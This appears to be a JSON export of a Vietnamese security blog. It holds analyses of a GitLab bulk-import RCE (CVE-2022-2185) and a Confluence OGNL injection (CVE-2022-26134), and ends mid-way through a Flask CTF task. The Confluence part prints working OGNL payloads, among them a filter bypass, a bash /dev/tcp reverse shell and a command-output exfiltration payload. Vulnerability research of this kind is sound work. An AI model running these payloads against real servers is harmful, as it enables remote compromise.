[{"content":"Brief CVE description L·ªó h·ªïng CVE-2022-2185 cho ph√©p authenticated user c√≥ quy·ªÅn import project th·ª±c hi·ªán import m·ªôt project b·ªã ch·ªânh s·ª≠a c√≥ y·∫øu t·ªë ƒë·ªôc h·∫°i c√≥ th·ªÉ d·∫´n ƒë·∫øn th·ª±c thi c√°c command nguy hi·ªÉm tr√™n h·ªá th·ªëng ch·∫°y Gitlab s·ª≠ d·ª•ng c√°c phi√™n b·∫£n b·ªã ·∫£nh h∆∞·ªüng.\nDanh s√°ch c√°c phi√™n b·∫£n b·ªã ·∫£nh h∆∞·ªüng:\n\u0026gt;=14.0, \u0026lt;14.10.5 \u0026gt;=15.0, \u0026lt;15.0.4 \u0026gt;=15.1, \u0026lt;15.1.1 ƒêi·ªÉm CVSS 3.1: 9.9 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H).\nAdvisory: https://about.gitlab.com/releases/2022/06/30/critical-security-release-gitlab-15-1-1-released/#remote-command-execution-via-project-imports\nCommit: https://gitlab.com/gitlab-org/gitlab/-/commit/fae2720ffd7ec5ce3eb88e3b68b2879f4f664cf4\nMitigation Upgrade l√™n phi√™n b·∫£n m·ªõi nh·∫•t c·ªßa Gitlab. Ph√¢n quy·ªÅn ng∆∞·ªùi d√πng ch·∫∑t ch·∫Ω, h·∫°n ch·∫ø t·ªëi ƒëa quy·ªÅn h·∫°n c·ªßa ng∆∞·ªùi d√πng c√≥ th·ªÉ s·ª≠ d·ª•ng c√°c t√≠nh nƒÉng kh√¥ng c·∫ßn thi·∫øt. Y√™u c·∫ßu ng∆∞·ªùi d√πng s·ª≠ d·ª•ng m·∫≠t kh·∫©u m·∫°nh. Analysis Sau khi ƒë·ªçc advisory v√† commit, ta nh·∫≠n bi·∫øt ƒë∆∞·ª£c r·∫±ng ƒë√¢y l√† l·ªói Command Injection v√† ƒëo·∫°n code l·ªói n·∫±m ·ªü class ImportExport::DecompressedArchiveSizeValidator.\nCh√∫ng ta c√≥ th·ªÉ th·∫•y r·∫±ng Gitlab ƒë√£ th√™m h√†m validate_archive_path (d√πng ƒë·ªÉ validate @archive_path c√≥ ph·∫£i l√† m·ªôt ƒë∆∞·ªùng d·∫´n tr·ªè ƒë·∫øn 1 t·∫≠p tin h·ª£p l·ªá hay kh√¥ng) ngay tr∆∞·ªõc khi ch·∫°y v√†o ƒëo·∫°n code th·ª±c thi command.\nBi·∫øn @archive_path ƒë∆∞·ª£c ƒë∆∞a tr·ª±c ti·∫øp v√†o gi√° tr·ªã c·ªßa command nh∆∞ h√¨nh d∆∞·ªõi ƒë√¢y:\nT·ª´ ƒë√≥, ta th·∫•y ƒë∆∞·ª£c r·∫±ng ch√∫ng ta c·∫ßn ph·∫£i t√¨m c√°ch control ƒë∆∞·ª£c @archive_path th√†nh input c·ªßa ta ƒë·ªÉ c√≥ th·ªÉ execute arbitrary command.\nClass DecompressedArchiveSizeValidator ƒë∆∞·ª£c s·ª≠ d·ª•ng trong 2 modules l√†:\nBulkImports::FileDecompressionService ImportExport::FileImporter Sau qu√° tr√¨nh review code, ta th·∫•y r·∫±ng ƒë·ªÉ control ƒë∆∞·ª£c @archive_path, ta c·∫ßn ph·∫£i control ƒë∆∞·ª£c project.import_source t·ª´ ImportExport::Importer. Code flow c·ªßa ch√∫ng ta nh∆∞ sau:\nTheo nh∆∞ commit th√¨ l·ªói c√≥ li√™n quan ƒë·∫øn ph·∫ßn x·ª≠ l√≠ cho bulk import n√™n ta s·∫Ω t·∫≠p trung v√†o module n√†y nhi·ªÅu h∆°n.\nDiff commit review Sau khi nh√¨n qua commit, c√≥ v√†i ƒëi·ªÉm ƒë√°ng l∆∞u √Ω sau ƒë√¢y:\nlib/bulk_imports/projects/transformers/project_attributes_transformer.rb spec/lib/bulk_imports/projects/transformers/project_attributes_transformer_spec.rb T·∫°i 2 file n√†y, ch√∫ng ta c√≥ th·ªÉ th·∫•y Gitlab fix c·ª©ng vi·ªác truy·ªÅn data th√¥ng qua GraphQL, ngƒÉn ch·∫∑n vi·ªác th√™m b·ªõt key b·∫±ng c√°ch:\nT·∫°o 1 hash m·ªõi t√™n project Th√™m t·ª´ng attribute c√≥ d·∫°ng symbol v√†o project Tr·∫£ v·ªÅ bi·∫øn project thay v√¨ tr·∫£ v·ªÅ tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ bi·∫øn data =\u0026gt; Ch√∫ng ta c√≥ th·ªÉ control ƒë∆∞·ª£c d·ªØ li·ªáu n√†y ƒë·ªÉ l√†m nh·ªØng b∆∞·ªõc ti·∫øp theo.\nDebugging ƒê·ªÉ thu·∫≠n ti·ªán cho vi·ªác debug, ch√∫ng ta c·∫ßn cho ph√©p Gitlab truy c·∫≠p v√†o c√°c ƒë·ªãa ch·ªâ IP trong local b·∫±ng c√°ch v√†o Admin Panel -\u0026gt; Settings -\u0026gt; Network, t·∫°i \u0026ldquo;Outbound requests\u0026rdquo; section, ch·ªçn v√†o \u0026ldquo;Allow requests to the local network from web hooks and services\u0026rdquo;.\nCh√∫ng ta h√£y b·∫Øt ƒë·∫ßu b·∫±ng vi·ªác kh·ªüi t·∫°o 1 bulk import session.\nCh·ªçn b·∫•t k√¨ repo n√†o c·∫ßn import v√† b·∫•m Import. Request c√≥ d·∫°ng nh∆∞ sau:\nPOST /import/bulk_imports.json HTTP/1.1 Host: gdk.test:3000 Cookie: [REDACTED] Content-Type: application/json Content-Length: 155 Connection: close {\u0026#34;bulk_import\u0026#34;:[{\u0026#34;source_type\u0026#34;:\u0026#34;group_entity\u0026#34;,\u0026#34;source_full_path\u0026#34;:\u0026#34;gitlab-org\u0026#34;,\u0026#34;destination_namespace\u0026#34;:\u0026#34;gitlab-org\u0026#34;,\u0026#34;destination_name\u0026#34;:\u0026#34;aaa\u0026#34;}]} T·∫°i file app/models/bulk_imports/entity.rb, ta th·∫•y ch·ª©c nƒÉng bulk import c√≥ h·ªó tr·ª£ import project b·∫±ng c√°ch ƒë·ªïi source_type th√†nh project_entity.\nV·ªõi POST data nh∆∞ h√¨nh tr√™n, ta ƒëang th·ª±c hi·ªán import project gitlab-org/gitlab-test ƒë·ªÉ t·∫°o ra project gitlab-org/aaa.\nƒê·∫∑t breakpoint t·∫°i h√†m create trong app/controllers/import/bulk_imports_controller.rb. Khi request v√†o endpoint tr√™n th√¨ ch∆∞∆°ng tr√¨nh s·∫Ω d·ª´ng t·∫°i breakpoint m√¨nh v·ª´a ƒë·∫∑t t·∫°i ƒë√¢y.\nBulkImports::CreateService.execute th·ª±c hi·ªán ch·ª©c nƒÉng import project b·∫±ng c√°ch th·ª±c thi BulkImportWorker.perform_async.\nClass method perform_async g·ªçi ƒë·∫øn instance method perform c·ªßa class BulkImportWorker.\nTrong ph∆∞∆°ng th·ª©c n√†y, c√≥ 1 d√≤ng g·ªçi t·ªõi class BulkImports::CreatePipelineTrackersService, class n√†y l·∫∑p qua c√°c pipelines ƒë∆∞·ª£c ƒë·ªãnh nghƒ©a trong lib/bulk_imports/projects/stage.rb.\nM·ª•c ƒë√≠ch d√πng ƒë·ªÉ ki·ªÉm tra xem pipeline n√†o ph√π h·ª£p ƒë·ªÉ th√™m v√†o tracker nh·∫±m th·ª±c hi·ªán ch·ª©c nƒÉng import.\nNh·ªØng pipeline n√†y ƒë∆∞·ª£c th·ª±c hi·ªán tu·∫ßn t·ª± b·ªüi BulkImports::Pipeline::Runner. C·ª• th·ªÉ nh∆∞ h√¨nh d∆∞·ªõi ƒë√¢y:\nNhi·ªám v·ª• c·ªßa Runner l√† l·∫∑p qua t·ª´ng extractor, transformer v√† loader c·ªßa pipeline ƒë·ªÉ x·ª≠ l√≠. D·ªØ li·ªáu ƒë∆∞·ª£c l·∫•y t·ª´ extractor s·∫Ω ƒë∆∞·ª£c truy·ªÅn v√†o cho c√°c transformers x·ª≠ l√≠ v√† d·ªØ li·ªáu sau khi qua transformer s·∫Ω ƒë∆∞·ª£c ƒë∆∞a v√†o loader.\nDigging into the root cause ProjectPipeline l√† pipeline ƒë·∫ßu ti√™n ƒë∆∞·ª£c ƒëi v√†o. L·∫ßn l∆∞·ª£t ƒëi v√†o c√°c extractor v√† transformer nh∆∞ ƒë√£ khai b√°o:\nGraphqlExtractor ƒë∆∞·ª£c g·ªçi v·ªõi tham s·ªë query - l√† k·∫øt qu·∫£ c·ªßa Graphql::GetProjectQuery d√πng ƒë·ªÉ l·∫•y d·ªØ li·ªáu t·ª´ GraphQL endpoint c·ªßa Gitlab. ProhibitedAttributesTransformer l·∫∑p qua c√°c attribute trong d·ªØ li·ªáu ƒë·ªÉ b·ªè ƒëi nh·ªØng attribute kh√¥ng cho ph√©p. ProjectAttributesTransformer c≈©ng ch√≠nh l√† transformer ƒë√£ xu·∫•t hi·ªán trong commit s·ª≠a l·ªói c·ªßa Gitlab. Nhi·ªám v·ª• ch√≠nh c·ªßa transformer n√†y l√† ƒë·ªÉ t·∫°o m·ªôt d·ªØ li·ªáu m·ªõi ch·ª©a nh·ªØng th√¥ng tin c·∫ßn thi·∫øt, ph·ª•c v·ª• cho c√°c pipeline ti·∫øp theo. ·ªû ƒë√¢y, bi·∫øn data ch√≠nh l√† d·ªØ li·ªáu ƒë∆∞·ª£c l·∫•y t·ª´ GraphqlExtractor ·ªü tr√™n. Sau khi kh·ªüi t·∫°o c√°c attribute c·∫ßn thi·∫øt cho bi·∫øn data, data.transform_keys!(\u0026amp;:to_sym) s·∫Ω ti·∫øn h√†nh transform c√°c keys trong bi·∫øn th√†nh ki·ªÉu Symbol. Nh∆∞ ta th·∫•y, bi·∫øn data ƒë√£ ƒë∆∞·ª£c th√™m c√°c attributes m·ªõi nh∆∞ name, path, import_type, visibility_level v√† namespace_id. Sau khi ho√†n th√†nh xong c√°c extractor v√† transformer, ch√∫ng ta s·∫Ω ƒë∆∞·ª£c nh·∫£y v√†o h√†m load ƒë·ªÉ ti·∫øp t·ª•c. Projects::CreateService.execute s·∫Ω ƒë∆∞·ª£c th·ª±c thi v·ªõi tham s·ªë data ·ªü tr√™n.\nƒê·ªÉ c√≥ th·ªÉ t·ª´ Projects::CreateService v·ªõi import_type l√† gitlab_project_migration ch·∫°y ƒë·∫øn ImportExport::Importer, ta search class n√†y trong codebase ƒë·ªÉ xem class n√†y ƒë∆∞·ª£c d√πng ·ªü ƒë√¢u.\nV·∫≠y l√† ImportExport::Importer ƒë∆∞·ª£c d√πng v·ªõi type l√† gitlab_project.\nT·∫°i ph∆∞∆°ng th·ª©c import_schedule, @project.import_state.schedule ƒë∆∞·ª£c ch·∫°y ƒë·ªÉ th·ª±c hi·ªán t·∫°o schedule cho import job khi th·ªèa m√£n c√°c ƒëi·ªÅu ki·ªán, c√≥ m·ªôt ƒëi·ªÅu ki·ªán l√† attribute import_type kh√¥ng ph·∫£i l√† gitlab_project_migration.\nƒê·ªÉ c√≥ th·ªÉ l√†m ƒë∆∞·ª£c ƒëi·ªÅu n√†y, ƒë·∫ßu ph∆∞∆°ng th·ª©c execute c·ªßa c√≥ s·ª≠ d·ª•ng class Projects::CreateFromTemplateService ƒë·ªÉ th·ª±c hi·ªán ch·ª©c nƒÉng t·∫°o project d·ª±a tr√™n m·ªôt built-in template ƒë∆∞·ª£c m√¥ t·∫£ t·∫°i ƒë√¢y.\nƒêi s√¢u v√†o class Projects::CreateFromTemplateService, ch√∫ng ta c√≥ th·ªÉ th·∫•y ƒë∆∞·ª£c ph∆∞∆°ng th·ª©c th·ª±c hi·ªán thay ƒë·ªïi attribute import_type t·∫°i Projects::GitlabProjectsImportService.prepare_import_params.\nSau khi ho√†n th√†nh prepare_import_params, n√≥ s·∫Ω ti·∫øn t·ª•c ch·∫°y Projects::CreateService m·ªôt l·∫ßn n·ªØa v·ªõi tham s·ªë params m·ªõi c√≥ attribute import_type l√† gitlab_project.\nS∆° ƒë·ªì c·ªßa flow nh∆∞ sau:\nQuay tr·ªü l·∫°i l√∫c l·∫ßn ƒë·∫ßu ti√™n ch·∫°y v√†o Projects::CreateService, ƒëi·ªÅu ki·ªán create_from_template? ƒë∆∞·ª£c ƒë·ªãnh nghƒ©a nh∆∞ sau\nKi·ªÉm tra n·∫øu 1 trong 2 attributes l√† :template_name v√† :template_project_id c√≥ xu·∫•t hi·ªán trong d·ªØ li·ªáu truy·ªÅn v√†o Project::CreateService.\nNh∆∞ v·∫≠y t·ªïng k·∫øt l·∫°i c·∫£ b√†i vi·∫øt, nh·ªØng b∆∞·ªõc exploit c·ªßa ch√∫ng ta nh∆∞ sau:\nT·∫°o 1 web proxy ƒë·ª©ng tr∆∞·ªõc 1 Gitlab server. Cho Gitlab connect v√†o web proxy c·ªßa ta. Th·ª±c hi·ªán request import project qua t√≠nh nƒÉng Bulk import. S·ª≠a response (ƒë√∫ng) tr·∫£ v·ªÅ t·ª´ Gitlab c·ªßa ta ƒë·ªÉ server nh·∫≠n ƒë∆∞·ª£c response (ƒë√£ s·ª≠a ƒë·ªïi) v·ªõi attribute m√† ta truy·ªÅn v√†o. RCE! Nh∆∞ng c√≤n ƒë√≥ m·ªôt ƒëi·ªÅu ƒë·∫∑c bi·ªát ·ªü l·ªói n√†y, n·∫±m ·ªü ImportExport::FileImporter.\nTr∆∞·ªõc khi ƒëi v√†o ph∆∞∆°ng th·ª©c validate_decompressed_archive_size ƒë·ªÉ th·ª±c thi command, n√≥ ƒëi v√†o ph∆∞∆°ng th·ª©c wait_for_archived_file tr∆∞·ªõc.\nPh∆∞∆°ng th·ª©c n√†y s·∫Ω ti·∫øp t·ª•c ch∆∞∆°ng tr√¨nh n·∫øu @archive_file l√† m·ªôt ƒë∆∞·ªùng d·∫´n file h·ª£p l·ªá v√† t·ªìn t·∫°i tr√™n h·ªá th·ªëng, ng∆∞·ª£c l·∫°i th√¨ s·∫Ω th·ª≠ l·∫°i 8 l·∫ßn, m·ªói l·∫ßn sleep 2n gi√¢y, v·ªõi n l√† s·ªë l·∫ßn ƒë√£ th·ª≠.\nSau ƒë√≥, ph∆∞∆°ng th·ª©c n√†y kh√¥ng th·ª±c hi·ªán k·∫øt th√∫c m√† d√πng yield ƒë·ªÉ th·ª±c hi·ªán c√°c ƒëo·∫°n code trong block do..end n√™n ch√∫ng ta v·∫´n th·ª±c hi·ªán ƒë∆∞·ª£c ph∆∞∆°ng th·ª©c validate_decompressed_archive_size nh∆∞ b√¨nh th∆∞·ªùng.\nKhi exploiting, @archive_file c·ªßa ta l√∫c n√†y kh√¥ng ph·∫£i l√† m·ªôt file h·ª£p l·ªá n·ªØa n√™n ta c·∫ßn ƒë·ª£i 28 - 1 = 255 gi√¢y th√¨ ch∆∞∆°ng tr√¨nh m·ªõi ti·∫øp t·ª•c.\nResults K·∫øt qu·∫£ sau khi ch·ªù 0xff gi√¢y:\n","permalink":"https://blog.undo.pw/posts/cve-2022-2185-gitlab-bulk-import-project/","summary":"Detail analysis of CVE-2022-2185","title":"Gitlab Remote Code Execution via Bulk Import Import Project - CVE-2022-2185"},{"content":"List of vuln references CVE: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-26134 Advisory: https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html Setup Kh·ªüi t·∫°o Confluence v·ªõi file docker-compose.yml c√≥ n·ªôi dung nh∆∞ sau:\nversion: \u0026#34;3.9\u0026#34; services: conf: image: atlassian/confluence-server:7.18.0 container_name: confluence-server depends_on: - db ports: - 8090:8090 - 8091:8091 - 5005:5005 environment: ATL_JDBC_URL: jdbc:postgresql://db:5432/confluence ATL_JDBC_USER: postgres ATL_JDBC_PASSWORD: postgres ATL_DB_TYPE: postgresql ATL_DB_DRIVER: org.postgresql.Driver ATL_DB_SCHEMA_NAME: confluence JVM_SUPPORT_RECOMMENDED_ARGS: -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005 ATL_LICENSE_KEY: [REDACTED] db: image: postgres restart: always container_name: confluence-database environment: POSTGRES_PASSWORD: postgres POSTGRES_DB: confluence Th√™m th·∫Øt m·ªôt ch√∫t cho vi·ªác debug t·ª´ file Yaml c√≥ s·∫µn t·∫°i: https://github.com/DataDog/security-labs-pocs/blob/main/proof-of-concept-exploits/confluence-cve-2022-26134/docker-compose.yml\nHow to diff S·ª≠ d·ª•ng c√¥ng c·ª• diff c√≥ s·∫µn c·ªßa IntelliJ IDEA:\nidea diff [folder1] [folder2] Theo advisory, b·∫£n patch ƒë∆∞·ª£c √°p d·ª•ng t·∫°i file xwork-1.0.3-atlassian-10.jar thay th·∫ø cho file c≈© xwork-1.0.3-atlassian-8.jar.\nSau khi load v√†o c√¥ng c·ª• diff, ti·∫øn h√†nh ch·ªçn c·∫£ 2 files, nh·∫•n chu·ªôt ph·∫£i v√† ch·ªçn Compare New Files with Each Other.\nRoot cause Trong method ActionChainResult.execute() th·ª±c hi·ªán method TextParseUtil.translateVariables() v·ªõi tham s·ªë l·∫ßn l∆∞·ª£t l√† 2 parameters namespace v√† actionName.\nMethod TextParseUtil.translateVariables() ƒë∆∞·ª£c ƒë·ªãnh nghƒ©a nh∆∞ sau:\n// com/opensymphony/xwork/util/TextParseUtil.class public static String translateVariables(String expression, OgnlValueStack stack) { StringBuilder sb = new StringBuilder(); Pattern p = Pattern.compile(\u0026#34;\\\\$\\\\{([^}]*)\\\\}\u0026#34;); Matcher m = p.matcher(expression); int previous; for (previous = 0; m.find(); previous = m.end()) { String g = m.group(1); int start = m.start(); String value; try { Object o = stack.findValue(g); value = o == null ? \u0026#34;\u0026#34; : o.toString(); } catch (Exception var10) { value = \u0026#34;\u0026#34;; } sb.append(expression.substring(previous, start)).append(value); } if (previous \u0026lt; expression.length()) { sb.append(expression.substring(previous)); } return sb.toString(); } Method n√†y th·ª±c hi·ªán vi·ªác t√¨m trong tham s·ªë expression gi√° tr·ªã n√†o th·ªèa m√£n v·ªõi regex \\\\$\\\\{([^}]*)\\\\} th√¨ s·∫Ω √°p d·ª•ng ph∆∞∆°ng th·ª©c OgnlValueStack.findValue() ƒë·ªÉ execute OGNL.\nQuay l·∫°i v·ªõi c√°c tham s·ªë ƒë∆∞·ª£c truy·ªÅn v√†o TextParseUtil.translateVariables(), gi√° tr·ªã c·ªßa namespace ƒë∆∞·ª£c l·∫•y t·ª´ ServletDispatcher.getNameSpace().\n// com/opensymphony/webwork/dispatcher/ServletDispatcher.class protected String getNameSpace(HttpServletRequest request) { String servletPath = request.getServletPath(); return getNamespaceFromServletPath(servletPath); } Method getNamespaceFromServletPath() ƒë∆∞·ª£c g·ªçi v·ªõi tham s·ªë l√† servletPath.\n// com/opensymphony/webwork/dispatcher/ServletDispatcher.class public static String getNamespaceFromServletPath(String servletPath) { servletPath = servletPath.substring(0, servletPath.lastIndexOf(\u0026#34;/\u0026#34;)); return servletPath; } Method n√†y s·∫Ω tr·∫£ v·ªÅ gi√° tr·ªã c·ªßa servletPath t·ª´ v·ªã tr√≠ ƒë·∫ßu ti√™n t·ªõi v·ªã tr√≠ c·ªßa k√≠ t·ª± / cu·ªëi c√πng.\n=\u0026gt; Nh∆∞ v·∫≠y ƒë·ªÉ OGNL expression c·ªßa ta ƒë∆∞·ª£c th·ª±c hi·ªán th√¨ k√≠ t·ª± / ph·∫£i ƒë∆∞·ª£c ƒë·∫∑t v√†o cu·ªëi servlet path.\nBypass isSafeExpression() check ƒê√¢y l√† c∆° ch·∫ø ƒë∆∞·ª£c th√™m v√†o Confluence sau phi√™n b·∫£n 7.16 nh·∫±m ngƒÉn ch·∫∑n c√°c OGNL expression ƒë·ªôc h·∫°i. C·ªët l√µi c·ªßa method isSafeExpression() l√† s·ª≠ d·ª•ng method isSafeExpressionInternal() n√™n ta ch·ªâ t·∫≠p trung v√†o ph√¢n t√≠ch h√†m n√†y.\n// com/opensymphony/xwork/util/SafeExpressionUtil.class private boolean isSafeExpressionInternal(String expression, Set\u0026lt;String\u0026gt; visitedExpressions) { if (!this.SAFE_EXPRESSIONS_CACHE.contains(expression)) { if (this.UNSAFE_EXPRESSIONS_CACHE.contains(expression)) { return false; } if (this.isUnSafeClass(expression)) { this.UNSAFE_EXPRESSIONS_CACHE.add(expression); return false; } if (SourceVersion.isName(this.trimQuotes(expression)) \u0026amp;\u0026amp; this.allowedClassNames.contains(this.trimQuotes(expression))) { this.SAFE_EXPRESSIONS_CACHE.add(expression); } else { try { Object parsedExpression = OgnlUtil.compile(expression); if (parsedExpression instanceof Node) { if (this.containsUnsafeExpression((Node)parsedExpression, visitedExpressions)) { this.UNSAFE_EXPRESSIONS_CACHE.add(expression); log.debug(String.format(\u0026#34;Unsafe clause found in [\\\u0026#34; %s \\\u0026#34;]\u0026#34;, expression)); } else { this.SAFE_EXPRESSIONS_CACHE.add(expression); } } } catch (RuntimeException | OgnlException var4) { this.SAFE_EXPRESSIONS_CACHE.add(expression); log.debug(\u0026#34;Cannot verify safety of OGNL expression\u0026#34;, var4); } } } return this.SAFE_EXPRESSIONS_CACHE.contains(expression); } L·∫ßn ƒë·∫ßu d·ª´ng t·∫°i h√†m n√†y, OGNL expression c·ªßa ta s·∫Ω ƒë∆∞·ª£c ƒë∆∞a v√†o method OgnlUtil.compile() ƒë·ªÉ parse, sau ƒë√≥ ƒë∆∞a v√†o method this.containsUnsafeExpression() ƒë·ªÉ x·ª≠ l√≠.\n// com/opensymphony/xwork/util/SafeExpressionUtil.class private boolean containsUnsafeExpression(Node node, Set\u0026lt;String\u0026gt; visitedExpressions) { String nodeClassName = node.getClass().getName(); if (UNSAFE_NODE_TYPES.contains(nodeClassName)) { return true; } else if (\u0026#34;ognl.ASTStaticMethod\u0026#34;.equals(nodeClassName) \u0026amp;\u0026amp; !this.allowedClassNames.contains(getClassNameFromStaticMethod(node))) { return true; } else if (\u0026#34;ognl.ASTProperty\u0026#34;.equals(nodeClassName) \u0026amp;\u0026amp; this.isUnSafeClass(node.toString())) { return true; } else if (\u0026#34;ognl.ASTMethod\u0026#34;.equals(nodeClassName) \u0026amp;\u0026amp; this.unsafeMethodNames.contains(getMethodInOgnlExp(node))) { return true; } else if (\u0026#34;ognl.ASTVarRef\u0026#34;.equals(nodeClassName) \u0026amp;\u0026amp; UNSAFE_VARIABLE_NAMES.contains(node.toString())) { return true; } else if (\u0026#34;ognl.ASTConst\u0026#34;.equals(nodeClassName) \u0026amp;\u0026amp; !this.isSafeConstantExpressionNode(node, visitedExpressions)) { return true; } else { for(int i = 0; i \u0026lt; node.jjtGetNumChildren(); ++i) { Node childNode = node.jjtGetChild(i); if (childNode != null \u0026amp;\u0026amp; this.containsUnsafeExpression(childNode, visitedExpressions)) { return true; } } return false; } } Method n√†y ho·∫°t ƒë·ªông b·∫±ng c√°ch parse OGNL expression th√†nh c√°c AST node r·ªìi l·∫∑p qua t·ª´ng node ƒë·ªÉ ki·ªÉm tra. Nh·ªØng y·∫øu t·ªë m√† th∆∞ vi·ªán XWork d·ª±a v√†o ƒë·ªÉ x√°c ƒë·ªãnh expression an to√†n hay kh√¥ng:\nNode type Class name Method name Variable name C·ª• th·ªÉ c√°c node, class, method v√† variable ƒë∆∞·ª£c xem l√† unsafe:\nv√† c√°c class name ƒë∆∞·ª£c xem l√† safe t·∫°i property allowedClassNames:\nMethod this.isUnsafeClass() c√≥ nhi·ªám v·ª• ki·ªÉm tra class name ƒë∆∞·ª£c s·ª≠ d·ª•ng trong expression c√≥ n·∫±m trong property unsafePropertyNames hay kh√¥ng.\nPayload testing ƒê·∫ßu ti√™n, ch√∫ng ta x√©t payload ƒë∆°n gi·∫£n sau:\n${@java.lang.Runtime@getRuntime().exec(\u0026#34;touch /tmp/pwned\u0026#34;)} Expression hi·ªán t·∫°i c·ªßa ta c√≥ d·∫°ng ognl.ASTChain.\nSau ƒë√≥ l·∫•y child node v√† ti·∫øp t·ª•c parse.\nHi·ªán t·∫°i nodeClassName c√≥ gi√° tr·ªã ognl.ASTStaticMethod v√† kh√¥ng n·∫±m trong allowedClassNames n√™n s·∫Ω tr·∫£ v·ªÅ true. ƒê·ªìng nghƒ©a v·ªõi vi·ªác payload c·ªßa ta ƒë√£ ƒë∆∞·ª£c xem l√† unsafe v√† s·∫Ω kh√¥ng th·ª±c hi·ªán payload n·ªØa.\nBypass ways Unicode escape S·ª≠ d·ª•ng c√°c k√≠ t·ª± ƒë∆∞·ª£c unicode escaped (\\u0041 =\u0026gt; a). Kƒ© thu·∫≠t n√†y ƒë∆∞·ª£c anh Jang vi·∫øt t·∫°i ƒë√¢y.\nV·ªÅ c∆° b·∫£n, trong qu√° tr√¨nh x·ª≠ l√≠ OGNL, method OgnlParserTokenManager.getNextToken() s·ª≠ d·ª•ng method JavaCharStream.readChar() c√≥ h·ªó tr·ª£ x·ª≠ l√≠ chu·ªói unicode escape n√™n ch√∫ng ta c√≥ th·ªÉ l·ª£i d·ª•ng ƒëi·ªÅu n√†y ƒë·ªÉ v∆∞·ª£t qua ƒë∆∞·ª£c b·ªô l·ªçc.\nN·ªëi chu·ªói √ù t∆∞·ªüng ƒë∆∞·ª£c l·∫•y t·ª´ blog c·ªßa anh @mr_r3bot.\n${Class.forName(\u0026#34;java.lang.\u0026#34;+\u0026#34;Runtime\u0026#34;).getMethod(\u0026#34;getRuntime\u0026#34;,null).invoke(null,null).exec(\u0026#34;touch /tmp/pwned\u0026#34;)}} Nh·ªØng th·ª© m√† payload n√†y s·ª≠ d·ª•ng ƒë·ªÉ v∆∞·ª£t qua ƒë∆∞·ª£c c√°c constraints:\nS·ª≠ d·ª•ng tr·ª±c ti·∫øp class Class thay v√¨ c√°c c√°ch nh∆∞: java.lang.Class, ''.class, ''.getClass(). T·∫°o th√†nh 2 chu·ªói con v√† s·ª≠ d·ª•ng n·ªëi chu·ªói ƒë·ªÉ gh√©p th√†nh java.lang.Runtime ·ªü giai ƒëo·∫°n runtime nh·∫±m bypass method this.isUnSafeClass() trong ƒëo·∫°n x·ª≠ l√≠ ƒë·ªëi v·ªõi ognl.ASTConst v·ªën n·∫±m ·ªü giai ƒëo·∫°n pre-processing. Ch√∫ng ta c√≥ nhi·ªÅu c√°ch ƒë·ªÉ ƒëa d·∫°ng h√≥a payload ·ªü b∆∞·ªõc n√†y v√¨ payload ƒë∆∞·ª£c th·ª±c hi·ªán ·ªü giai ƒëo·∫°n runtime. Tham kh·∫£o th√™m t·∫°i ƒë√¢y.\nV√¨ s·ª≠ d·ª•ng kƒ© thu·∫≠t Reflection ƒë·ªÉ truy c·∫≠p v√†o c√°c method trong class Runtime, c·ªông v·ªõi vi·ªác 2 method l√† getMethod v√† invoke kh√¥ng b·ªã ch·∫∑n n√™n ta c√≥ th·ªÉ call ƒë∆∞·ª£c method Runtime.exec(). S·ª≠ d·ª•ng c√°c class c√≥ s·∫µn v√† kh√¥ng b·ªã blacklist Payload n√†y ƒë∆∞·ª£c l·∫•y t·ª´ repo jbaines-r7/through_the_wire. Th√¥ng tin r·∫±ng ƒë√¢y l√† payload ban ƒë·∫ßu m√† nh√≥m APT-31 ƒë√£ th·ª±c hi·ªán t·∫•n c√¥ng khi·∫øn cho l·ªó h·ªïng 0-day c·ªßa Confluence l√∫c n√†y b·ªã ph√°t hi·ªán v√† ƒë∆∞·ª£c bi·∫øt ƒë·∫øn r·ªông r√£i nh∆∞ hi·ªán t·∫°i.\n${Class.forName(\u0026#34;com.opensymphony.webwork.ServletActionContext\u0026#34;).getMethod(\u0026#34;getResponse\u0026#34;,null).invoke(null,null).setHeader(\u0026#34;\u0026#34;, Class.forName(\u0026#34;javax.script.ScriptEngineManager\u0026#34;).newInstance().getEngineByName(\u0026#34;nashorn\u0026#34;).eval(\u0026#34;new java.lang.ProcessBuilder().command(\u0026#39;bash\u0026#39;,\u0026#39;-c\u0026#39;,\u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/IP/PORT 0\u0026gt;\u0026amp;1\u0026#39;).start()\u0026#34;))} Payload n√†y c√≥ nhi·ªám v·ª• ch√≠nh l√† kh·ªüi t·∫°o 1 nashorn instance (Javascript engine ƒë∆∞·ª£c t√≠ch h·ª£p v√†o Java) v√† g·ªçi ƒë·∫øn ProcessBuilder.command() nh·∫±m m·ª•c ƒë√≠ch ch·∫°y payload ƒë·ªÉ reverse shell.\nCh√∫ng ta c√≥ th·ªÉ vi·∫øt l·∫°i ƒë·ªÉ payload n√†y tr·∫£ v·ªÅ k·∫øt qu·∫£ t·∫°i gi√° tr·ªã trong header response nh∆∞ sau:\n${Class.forName(\u0026#34;com.opensymphony.webwork.ServletActionContext\u0026#34;).getMethod(\u0026#34;getResponse\u0026#34;,null).invoke(null,null).setHeader(\u0026#34;Result\u0026#34;,Class.forName(\u0026#34;javax.script.ScriptEngineManager\u0026#34;).newInstance().getEngineByName(\u0026#34;nashorn\u0026#34;).eval(\u0026#34;res=\u0026#39;\u0026#39;;is=java.lang.Runtime.getRuntime().exec(\u0026#39;id\u0026#39;).getInputStream();while(is.available())res+=String.fromCharCode(is.read());res\u0026#34;))} ","permalink":"https://blog.undo.pw/posts/cve-2022-26134-confluence-ognl-injection/","summary":"Brief analysis of CVE-2022-26134","title":"Atlassian Confluence Server and Data Center - OGNL Injection - CVE-2022-26134"},{"content":"TSULOTT3 ƒê·ªÅ ch·ªâ c√≥ 1 file main.py nh∆∞ sau:\nfrom flask import Flask, session, request, render_template, render_template_string from flask_session import Session from random import randint as ri app = Flask(__name__) SESSION_TYPE = \u0026#39;filesystem\u0026#39; app.config.from_object(__name__) Session(app) cheat = \u0026#34;Pls Don\u0026#39;t cheat! \u0026#34; def check_session(input): if session.get(input) == None: return \u0026#34;\u0026#34; return session.get(input) @app.route(\u0026#34;/\u0026#34;, methods=[\u0026#34;GET\u0026#34;,\u0026#34;POST\u0026#34;]) def index(): try: 